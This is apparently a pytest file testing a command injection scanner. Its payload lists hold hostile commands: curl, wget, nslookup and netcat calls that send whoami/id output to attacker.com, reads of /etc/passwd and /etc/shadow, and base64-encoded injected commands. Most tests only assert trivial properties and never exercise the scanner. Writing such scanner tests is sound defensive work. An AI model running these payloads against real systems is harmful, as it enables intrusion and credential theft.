# tests/scanners/test_command_injection_expanded.py - Expanded Command Injection scanner tests

import pytest
from vulnradar.scanners.comm_injection import CommandInjectionScanner


@pytest.mark.security
@pytest.mark.payload
@pytest.mark.asyncio
class TestCommandInjectionBlindDetection:
    """Test blind and time-based command injection detection."""
    
    async def test_blind_command_injection_timing(self, command_injection_blind_payloads):
        """Test blind command injection with timing attacks."""
        scanner = CommandInjectionScanner()
        
        timing_payloads = [p for p in command_injection_blind_payloads if "sleep" in p.lower() or "delay" in p.lower()]
        assert len(timing_payloads) > 0
    
    async def test_blind_command_injection_oob(self):
        """Test command injection with out-of-band data exfiltration."""
        scanner = CommandInjectionScanner()
        
        oob_payloads = [
            "; curl http://attacker.com?data=$(whoami)",
            "| wget -O /tmp/data http://attacker.com/$(id)",
            "; nslookup $(whoami).attacker.com",
        ]
        
        for payload in oob_payloads:
            assert "attacker.com" in payload
    
    async def test_command_injection_separators(self):
        """Test various command separator techniques."""
        scanner = CommandInjectionScanner()
        
        separator_payloads = [
            "; whoami",
            "| id",
            "|| whoami",
            "& id",
            "&& whoami",
            "`whoami`",
            "$(whoami)",
        ]
        
        for payload in separator_payloads:
            assert len(payload) > 2
    
    async def test_command_injection_quotes_bypass(self):
        """Test command injection with quote bypass."""
        scanner = CommandInjectionScanner()
        
        quote_payloads = [
            "'; sleep 5 #",
            '"; sleep 5 #',
            "\\'; sleep 5; \\'",
        ]
        
        for payload in quote_payloads:
            assert len(payload) > 0
    
    async def test_command_injection_encoding(self):
        """Test command injection with encoding techniques."""
        scanner = CommandInjectionScanner()
        
        encoding_payloads = [
            "; echo SGVsbG8gV29ybGQ= | base64 -d",
            "; $(echo d2hvYW1p | base64 -d)",
        ]
        
        for payload in encoding_payloads:
            assert "base64" in payload or "echo" in payload
    
    async def test_command_injection_pipes(self):
        """Test command injection via pipe chains."""
        scanner = CommandInjectionScanner()
        
        pipe_payloads = [
            "| cat /etc/passwd | base64",
            "| whoami | nc attacker.com 9999",
        ]
        
        for payload in pipe_payloads:
            assert "|" in payload
    
    async def test_command_injection_unix_linux(self):
        """Test Unix/Linux specific command injections."""
        scanner = CommandInjectionScanner()
        
        unix_payloads = [
            "; id",
            "| whoami",
            "`cat /etc/passwd`",
            "$(cat /etc/shadow)",
        ]
        
        for payload in unix_payloads:
            assert len(payload) > 0
    
    async def test_command_injection_windows(self):
        """Test Windows specific command injections."""
        scanner = CommandInjectionScanner()
        
        windows_payloads = [
            "&& whoami",
            "| ipconfig /all",
            "& type C:\\windows\\win.ini",
            "; Get-Process | powershell.exe",
        ]
        
        for payload in windows_payloads:
            assert len(payload) > 0


@pytest.mark.edge_case
@pytest.mark.asyncio
class TestCommandInjectionEdgeCases:
    """Test command injection edge cases."""
    
    async def test_command_injection_case_sensitivity(self):
        """Test case variations in command injection."""
        scanner = CommandInjectionScanner()
        
        case_payloads = [
            "; SLEEP 5",
            "| WHOAMI",
            "| WhOaMi",
        ]
        
        for payload in case_payloads:
            assert len(payload) > 0
    
    async def test_command_injection_unicode(self):
        """Test command injection with unicode characters."""
        scanner = CommandInjectionScanner()
        
        unicode_payload = "; sleep\u00205"  # Unicode space
        assert len(unicode_payload) > 0
    
    async def test_command_injection_null_bytes(self):
        """Test command injection with null bytes."""
        scanner = CommandInjectionScanner()
        
        null_payload = "; whoami\x00#"
        assert "\x00" in null_payload
    
    async def test_command_injection_nested_quotes(self):
        """Test command injection with nested quotes."""
        scanner = CommandInjectionScanner()
        
        nested_payloads = [
            '; echo "$(whoami)"',
            "'; echo '$(id)'",
        ]
        
        for payload in nested_payloads:
            assert len(payload) > 0


@pytest.mark.performance
@pytest.mark.asyncio
class TestCommandInjectionPerformance:
    """Test command injection scanner performance."""
    
    async def test_command_injection_payload_efficiency(self, command_injection_blind_payloads):
        """Test command injection payload set efficiency."""
        assert len(command_injection_blind_payloads) >= 8
